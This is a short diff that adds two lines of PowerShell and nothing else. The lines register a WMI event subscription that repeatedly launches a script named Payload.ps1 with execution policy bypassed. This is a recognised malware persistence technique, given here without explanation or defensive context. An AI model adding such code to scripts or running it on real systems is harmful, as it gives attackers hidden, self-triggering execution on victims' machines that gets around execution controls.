@@ -1,0 +1,2 @@
+$query = "SELECT * FROM __InstanceModificationEvent WITHIN 10 WHERE TargetInstance ISA 'Win32_ComputerSystem'"
+Register-WmiEvent -Query $query -Action { Invoke-Expression "powershell.exe -NoProfile -ExecutionPolicy Bypass -File C:\Path\To\Payload.ps1" }
